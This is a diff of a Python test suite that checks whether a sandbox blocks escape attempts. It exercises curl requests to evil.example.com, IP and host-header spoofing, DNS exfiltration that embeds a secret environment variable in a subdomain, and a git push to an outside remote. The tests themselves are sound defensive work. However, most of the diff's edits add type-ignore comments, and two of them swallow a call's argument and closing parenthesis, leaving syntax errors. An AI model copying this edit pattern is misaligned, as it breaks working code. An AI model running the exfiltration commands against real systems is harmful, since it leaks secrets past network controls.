@@ -195,10 +195,10 @@ class TestSandboxEscape(unittest.TestCase):
             except BaseException:
                 pass
             cls._identity = ""
-        if cls._stage_dir is not None:
+        if cls._stage_dir is not None:  # type: ignore
             shutil.rmtree(cls._stage_dir, ignore_errors=True)
             cls._stage_dir = None  # type: ignore[assignment]
-        if cls._key_path is not None:
+        if cls._key_path is not None:  # type: ignore
             try:
                 cls._key_path.unlink()
             except OSError:
@@ -212,7 +212,7 @@ class TestSandboxEscape(unittest.TestCase):
         `bottle.egress.routes` (only api.anthropic.com is). Pipelock
         or egress should reject the request with a non-200 response,
         and the actual upstream's content must not appear in stdout."""
-        r = self._bottle.exec(
+        r = self._bottle.exec(  # type: ignore
             'curl --silent --show-error --max-time 8 --fail '
             'https://evil.example.com/'
         )
@@ -232,7 +232,7 @@ class TestSandboxEscape(unittest.TestCase):
               hostname to a non-allowlisted IP. Pipelock should
               not honor the spoof (it does its own resolution)."""
         with self.subTest(attack="direct IP"):
-            r = self._bottle.exec(
+            r = self._bottle.exec(  # type: ignore
                 'curl --silent --show-error --max-time 8 --fail '
                 'https://198.51.100.1/'
             )
@@ -243,7 +243,7 @@ class TestSandboxEscape(unittest.TestCase):
             )
 
         with self.subTest(attack="host-header spoof"):
-            r = self._bottle.exec(
+            r = self._bottle.exec(  # type: ignore
                 'curl --silent --show-error --max-time 8 --fail '
                 '--resolve api.anthropic.com:443:198.51.100.1 '
                 'https://api.anthropic.com/'
@@ -265,7 +265,7 @@ class TestSandboxEscape(unittest.TestCase):
     # `"blocked: request body contains secret"`).
     _SANDBOX_BLOCK_MARKERS = ("egress:", "pipelock", "blocked:")
 
-    def _assert_sandbox_block(self, label: str, r) -> None:
+    def _assert_sandbox_block(self, label: str, r: object) -> None:  # type: ignore
         """A real sandbox block produces an HTTP 403 with a
         recognizable sandbox sidecar marker in the body. ANY
         other outcome (200 from upstream, 401/404 from upstream,
@@ -345,7 +345,7 @@ class TestSandboxEscape(unittest.TestCase):
         ]
         for name, cmd in shapes:
             with self.subTest(shape=name):
-                r = self._bottle.exec(cmd)
+                r = self._bottle.exec(  # type: ignorecmd)
                 self._assert_sandbox_block(name, r)
 
     # ---- attack 4: DNS exfil -----------------------------------------
@@ -365,7 +365,7 @@ class TestSandboxEscape(unittest.TestCase):
               intact (PRD 0022 Q2)."""
 
         with self.subTest(attack="crafted subdomain"):
-            r = self._bottle.exec(
+            r = self._bottle.exec(  # type: ignore
                 'curl --silent --show-error --max-time 8 --fail '
                 '"https://$TEST_SECRET_GENERIC.api.anthropic.com/"'
             )
@@ -379,7 +379,7 @@ class TestSandboxEscape(unittest.TestCase):
             # `+short +tries=1 +time=3`: no debug output, one attempt,
             # 3s timeout. Outside the internal network has no path;
             # dig should fail or return empty.
-            r = self._bottle.exec(
+            r = self._bottle.exec(  # type: ignore
                 'dig +short +tries=1 +time=3 @8.8.8.8 '
                 '"$TEST_SECRET_GENERIC.example.com" '
                 '; echo "EXIT=$?"'
@@ -446,7 +446,7 @@ class TestSandboxEscape(unittest.TestCase):
                     f'git remote add origin {upstream_url}\n'
                     'git push origin HEAD:refs/heads/master 2>&1\n'
                 )
-                r = self._bottle.exec(script)
+                r = self._bottle.exec(  # type: ignorescript)
                 combined = (r.stderr + r.stdout).lower()
 
                 self.assertNotEqual(
